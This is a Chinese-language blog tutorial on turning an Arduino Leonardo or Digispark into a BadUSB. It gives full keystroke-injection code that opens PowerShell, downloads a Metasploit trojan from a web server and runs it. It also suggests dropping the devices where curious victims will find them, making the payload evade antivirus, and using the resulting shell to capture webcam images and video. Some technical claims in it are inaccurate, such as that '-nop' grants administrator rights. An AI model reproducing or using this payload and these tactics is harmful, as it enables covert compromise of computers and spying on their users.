BadUSB的故事最早要从2014年的黑帽大会上研究人员JakobLell和Karsten Nohl提出并展示的USB对电脑进行攻击说起。不同于老式的U盘病毒，它利用了USB协议中的一个漏洞，通过模拟键盘、鼠标、网卡等从而让目标电脑执行恶意代码，达到控住主机或者窃取敏感信息。





当然啦，如果恶意的攻击者想要直接把USB插在你办公室的电脑上还是很有难度的，（毕竟插了之后还得跑赢公司的保安），但我们试想这样的一个场景：当你在地下停车场，或者是马路上，在你去公司的必经之路上看到了一个被遗弃的干净的USB，你是会选择顺脚把它踢进垃圾桶，还是选择弯腰将其捡起来之后带回办公室插在电脑上查看里面的信息呢？




Badusb的制作者们正是利用人们想要偷窥他人隐私的好奇心，而导致内含恶意代码的usb被插在受害者的电脑上，再加上杀毒软件只会对移动存储介质的内容进行查杀，而Badusb被插在电脑上的时候会被电脑识别为键盘，就不会被电脑上的杀毒软件查杀。也就是说，只要运行的payload是免杀的，那么BadUSB就不会被防护软件拦截。



那么问题来了，我们要怎么才能制作一个自己专属BadUSB呢？


工欲善其事，必先利其器。我们第一步先要安装好Arduino IDE编程环境，之后我们还需要下载该板的兼容包，喝杯咖啡的功夫就安装好了，Arduino IDE的网址在这里：


https://www.arduino.cc/en/main/software



选择自己电脑的环境进行相应下载，我这里是windows10，所以就选择右上角的下载:windowsXP版本以及更高版本下载。


这里拿来制作BadUSB的单片机板子是ArduinoLeonardo ，拿来练手的话性价比挺高的，（哼，我才不是因为穷才买的这个），万能的淘宝上就有卖，为了避免广告嫌疑就不放图片了，价格大概在十块到三十左右不等，另外我们还需要一根micro的数据线（就是以前的那种安卓数据线），用来连接电脑和单片机，以烧录程序。


如果有的小伙伴用的是digispark的板子的话，在文末我也会给出部分安装环境的建议哒，所以不用心急，先看写代码的部分吧。




我们打开Arduino IDE之后，首先选择开发板的类型，点击工具-->开发板-->Arduino Leonardo，选择了之后，看到主页面，就可以开始愉快的coding了。



网上关于BadUSB的代码不是很多，大部分都是打开一个计算器或者是弹出cmd命令行之类的，这里我的想法是使用kali linux制作一个木马后门exe，将其放置在自己的网站上，BadUSB编写打开powershell的代码，并且执行在公网自己网站上下载这个木马exe同时运行的操作，这样kali linux就可以获取一个shell，而进一步做什么就靠发挥自己的想象力了。（互联网并非法外之地，请自重）


这里我直接使用的是phpstudy的本地网站，进行简单的下载木马并且运行的操作，制作免杀过狗木马下次有机会再写文章专门说这一块，这里有篇文章的大佬已经讲了如何通过MSFVenom生成exe后门木马拿shell：


https://www.jianshu.com/p/ae30c3fb8269


本菜鸡就不再赘述，现在我们将生成的木马Cl0ud.exe放在127.0.0.1本地的网站下。



插句题外话，使用框架生成的木马在目标点击后，就能对目标主机执行各种操作，然而木马exe的大小仅仅为几十kb，这里不得不敬佩metasploit框架编写的那一群天才黑客们。


好，现在我们开始编写代码，先直接放源代码吧，然后对每个地方进行必要的讲解：


#include <Keyboard.h>

void setup() {

  Keyboard.begin();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);

  delay(200);

 Keyboard.press('r');

  delay(300);

  Keyboard.release(KEY_LEFT_GUI);

  Keyboard.release('r');

  Keyboard.press(KEY_CAPS_LOCK);//切换大小写，绕过输入法

  Keyboard.release(KEY_CAPS_LOCK);

  delay(500);

  Keyboard.println("powershell -nop");

  delay(200);

  Keyboard.press(KEY_RETURN);//按下回车键

  delay(200);

  Keyboard.release(KEY_RETURN);

  delay(500);

  Keyboard.println("$client = new-object System.Net.WebClient; ");

  Keyboard.press(KEY_RETURN);

  delay(200);

  Keyboard.release(KEY_RETURN);

  delay(500);

  Keyboard.println("$client.DownloadFile('http://127.0.0.1/Cl0ud.exe','D://test/Cl0ud.exe')");

  Keyboard.press(KEY_RETURN);

  delay(200);

 Keyboard.release(KEY_RETURN);

  delay(500);

  Keyboard.println("D://test/Cl0ud.exe");

  Keyboard.press(KEY_RETURN);

  delay(200);

  Keyboard.release(KEY_RETURN);

  delay(500);

  Keyboard.println("exit");

  Keyboard.end();//结束键盘通讯

}

void loop()

{

}


首先我们导入编写BadUSB代码所必须的库文件，就像是写C语言的时候我们第一行往往写的是#include<stdio.h>一样，在主程序这里我们不需要写main函数，因为它已经默认有了主函数，setup()函数是初始化函数，loop()函数是循环函数，我们可以在setup函数里面写对插入USB主机的操作，在loop里面执行循环的操作。


然后使用Keyboard.begin()进行键盘的通讯，BadUSB利用的就是USB协议中存在的安全漏洞，将USB伪装成了一个键盘对电脑进行输入的控制，当然我们在代码的最后也要使用对应的Keyboard.end()来结束键盘通讯。


press和release可以看做是我们的手对键盘进行按下和松开的操作，这里模拟的是键盘输入，自然少不了这两个控制按钮，我们使用win+r打开运行窗口，并且输入powershell -nop 并且回车，打开powershell。这里大家可能会说要是对方电脑这个时候是中文输入法，那不就是应该多按下一次回车才能有输入吗？以及powershell和-nop两者之间的空格的处理在代码里比较麻烦，如果只是针对中文输入法的话，对于非中文输入法又没有了适用性。


在这里我们采用开启大写锁定来绕过中文输入法，因为windows下面是不区分大小写的，所以我们采取这个方式下载的木马文件可能是这个样子的


这种情况也不用担心，它还是你原来的那个木马，不过长得变了形而已(hhh)

我们在powershell里面输入了下载命令之后下载到指定的文件夹下，这样的话方便我们下一个命令直接执行该文件夹下的exe文件，执行之后输入exit退出，整个过程时间很短，（我为了看到效果特意延长了delay的时间），这样就编写好了我们的第一个BadUSB啦。


点击项目-->编译/验证，稍等片刻，就编译好了，如果没有错误的话，插入数据线之后就可以烧录到单片机里面了。插入数据线之后，选择 工具-->端口 ，选择插入数据线的COM口，然后点击 项目-->上传，等几秒钟就烧录好了。

烧录之后马上就会执行BadUSB里面的程序，我们在上传之前先开启kali linux上面对该木马的监听，测试我们是否能够控制自己的主机（此时的主机和kali linux应当是在同一局域网内的)




这时候开始上传，powershell的命令行闪过，接着我们的kali收到了返回的shell:



我们可以使用webcam_list查看主机摄像头列表，使用webcam_snap或者是webcam_stream进行快照或者摄像头视频监控。




这里我的摄像头被我用创口贴贴上了，但是也验证了实际上是可以拍摄图片的。（这下妈妈终于知道为什么我要给电脑贴上创口贴了！）


当然监控以及偷窥他人隐私只是其中功能的冰山一角，还有很多可以使用这个shell做到的事情，相信到这里你已经使用谷歌去搜索更多的扩展功能了。


嘻嘻，这些就是使用Arduino Leonardo编写自己专属简易的BadUSB的全部内容，现在简单说一下使用digispark板子的同学，需要在文件 -->首选项 把这个网址添加到附加开发板管理网址。


https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json





点击 好 ，之后打开开发板管理器，选择开发板的类型为Digispark(Default-16.5mhz)，这个时候就会自动更新一些东西，速度比较慢，选择使用代理下载或者耐心等待。


然后我们需要在Arduino中添加Digispark的支持，打开工具-->开发板-->开发板管理器，输入digistump，并且下载显示的第一个，也就是Digistump *R Boards（图中第一个）。



下载好了之后就会有像我图片里面的那种绿色INSTALLED图标出现。

接着安装Windows下的驱动，下载Digistump.Drivers，链接如下:


https://github.com/digistump/DigistumpArduino/releases


解压后执行Install Drivers.exe即可


这一部分就是要编写digispark所需要的除IDE之外的驱动程序安装，接下来同样也可以进行自己对于代码的创造了。



注意事项:

1，使用powershell的原因是下载文件的时候CMD不支持，使用powershell之后不是管理员身份下载也会出错，所以我们要使用powershell -nop 用管理员权限打开powershell。


2，指定的目录需要使用\\双斜杠。


3，digispark有一个不好的地方在于每次只有在IDE里面编译了之后才能运行里面的程序，如果拔出后再插在电脑上就不会执行里面的代码了，如果有解决办法的朋友可以告知我，不胜感激
